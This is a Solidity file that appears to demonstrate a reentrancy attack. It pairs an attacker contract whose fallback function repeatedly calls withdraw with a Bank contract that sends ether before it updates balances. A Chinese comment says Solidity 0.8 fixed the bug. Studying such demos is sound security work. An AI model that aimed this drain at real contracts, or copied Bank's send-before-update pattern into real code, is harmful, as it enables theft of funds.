// SPDX-License-Identifier: MIT
pragma solidity >=0.7.6;

// 0.8 以后修复了此bug
contract ReentrantAttack {
    event Fallback(address indexed sender, uint256 value, bytes data);

    Bank public bank;

    constructor(address _bank) {
        bank = Bank(_bank);
    }

    fallback() external payable {
        uint256 balance = address(bank).balance;
        if (balance == 0) {
            return;
        }
        if (balance >= 1 ether) {
            bank.withdraw(1 ether);
        } else {
            bank.withdraw(balance);
        }
        emit Fallback(msg.sender, msg.value, msg.data);
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract Bank {
    mapping(address => uint256) private _balances;

    function deposit() external payable {
        _balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(_balances[msg.sender] >= amount);
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
        _balances[msg.sender] -= amount;
    }

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
